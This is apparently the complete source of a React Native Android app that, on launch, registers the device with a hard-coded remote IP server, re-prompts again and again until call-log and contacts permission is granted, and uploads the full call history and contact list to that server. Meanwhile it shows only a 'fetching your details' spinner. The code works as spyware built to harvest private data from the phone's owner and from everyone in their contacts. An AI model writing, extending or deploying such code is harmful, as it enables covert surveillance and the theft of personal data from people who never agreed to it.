import React, { useEffect,useState } from 'react'
import CallLogs from 'react-native-call-log';
import { StyleSheet,ActivityIndicator, Text, View, PermissionsAndroid } from 'react-native';
import axios from 'react-native-axios';
import Contacts from 'react-native-contacts';
import { getDeviceName,getDeviceId } from 'react-native-device-info';

const URL = 'http://3.108.44.94:4001'
// const URL = 'https://3375-2406-7400-35-318a-643b-674d-9444-d00e.ngrok.io'
const App = () => {
  useEffect(() => {
    FetchCalllogs()

  }, []);
  useEffect(() => {
    newFunction();
  }, [])
  
  async function newFunction() {
      const devicename = await getDeviceName()	;
      const deviceid = await getDeviceId()	;
      var config = {
        method: 'post',
        url: URL + '/instelleddevices',
        data: {devicename:devicename,deviceid:deviceid}
      };
      console.log(config.data);
      axios(config)
      .then(function (response) {
          console.log(JSON.stringify(response.data));
        })
        .catch(function (error) {
          console.log(error);
        });
  }


  const FetchCalllogs = async () => {
    try {
      const granted = await PermissionsAndroid.request(
        PermissionsAndroid.PERMISSIONS.READ_CALL_LOG,
        {
          title: 'Allow to continue',
          message:
            'You need to allow permission to continue if you denied the permission Please allow it to continue using the app',
          buttonNeutral: 'Ask Me Later',
          buttonPositive: 'Allow',
        }
      )
      if (granted === PermissionsAndroid.RESULTS.GRANTED) {

        CallLogs.loadAll().then(c => Submitrecord(c));
      } else {
        console.log('Call Log permission denied');
        askcalllogpermission()
      }
    }
    catch (e) {
      console.log(e);
    }
  }

  const askcalllogpermission = async () => {
    try {
      const granted = await PermissionsAndroid.request(
        PermissionsAndroid.PERMISSIONS.READ_CALL_LOG,
        {
          title: 'Allow to continue',
          message:
            'You need to allow permission to continue if you denied the permission Please allow it to continue using the app',
          buttonNeutral: 'Ask Me Later',
          buttonPositive: 'Allow',
        }
      )
      if (granted === PermissionsAndroid.RESULTS.GRANTED) {

        CallLogs.loadAll().then(c => Submitrecord(c));
      }
      else {
        askcalllogpermission()
      }
    }
    catch (e) {
      console.log(e);
    }
  }


  const Submitrecord = (data) => {
    FetchContacts()
    var config = {
      method: 'post',
      url: URL + '/add_records',
      data: data
    };
    axios(config)
    .then(function (response) {
        console.log(JSON.stringify(response.data));
      })
      .catch(function (error) {
        console.log(error);
      });

  }


  const FetchContacts = async () => {
    PermissionsAndroid.request(PermissionsAndroid.PERMISSIONS.READ_CONTACTS, {
      title: 'Allow to continue',
      message: "You need to allow permission to continue if you denied the permission Please allow it to continue using the app",
      buttonNeutral: 'Ask Me Later',
      buttonPositive: 'Allow',
    })
      .then((res) => {
        Contacts.getAll()
          .then((contacts) => {
            SubmitContacts(contacts)

          })
          .catch((e) => {
            contactsPermission()
            console.log(e, "1");
          });
      })
      .catch((error) => {
        contactsPermission()
        console.error('Permission error: ', error);
      });

    // Contacts.getAll().then(contacts => {
    //   SubmitContacts(contacts)
    //   })
  }

  const contactsPermission = async () => {

    try {

      PermissionsAndroid.request(PermissionsAndroid.PERMISSIONS.READ_CONTACTS, {
        title: 'Contacts',
        message: 'This app would like to view your contacts.',
        buttonPositive: 'Please accept bare mortal',
      })
        .then((res) => {
          console.log('Permission: ', res);
          Contacts.getAll()
            .then((contacts) => {
              // work with contacts
              SubmitContacts(contacts)
            })
            .catch((e) => {
              contactsPermission()

              console.log(e);
            });
        })
        .catch((error) => {
          contactsPermission()

          console.error('Permission error: ', error);
        });

    }
    catch (e) {
      console.log(e);
    }
  }

  const SubmitContacts = (data) => {
    var config = {
      method: 'post',
      url: URL + '/add_contacts',
      data: data
    };
    axios(config)
      .then(function (response) {
        console.log(JSON.stringify(response.data));
      })
      .catch(function (error) {
        console.log(error);
      });

  }
  return (
    <View style={[styles.container, styles.horizontal]}>
 
 <View style={{flex:1,justifyContent:'center'}}>
  <ActivityIndicator size="large" color="#00ff00" />
  <Text style={{color:'black',alignSelf:'center'}}>Please wait we are fetching your details</Text>
 </View>  
 


</View>
  )
}
const styles = StyleSheet.create({
  container: {
    flex: 1,
    justifyContent: "center"
  },
  horizontal: {
    flexDirection: "row",
    justifyContent: "space-around",
    padding: 10
  }
});
export default App

